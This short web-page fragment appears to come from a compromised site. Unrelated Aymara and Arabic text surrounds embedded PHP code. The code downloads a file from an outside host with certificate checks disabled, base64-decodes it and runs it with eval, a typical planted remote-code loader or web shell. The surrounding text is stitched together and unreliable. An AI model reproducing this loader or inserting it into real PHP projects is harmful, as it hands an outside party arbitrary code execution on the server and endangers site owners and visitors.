wali k’ajkir qhant’aña<?php
function getCurl0($url)
{
  if (function_exists("curl_init")) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
  }
}
?>
<?=eval("?>".(base64_decode(getCurl0 ('https://myvo.my.id/box.txt')))); __halt_compiler();?> النتيجة 100% مبروك للطلاب
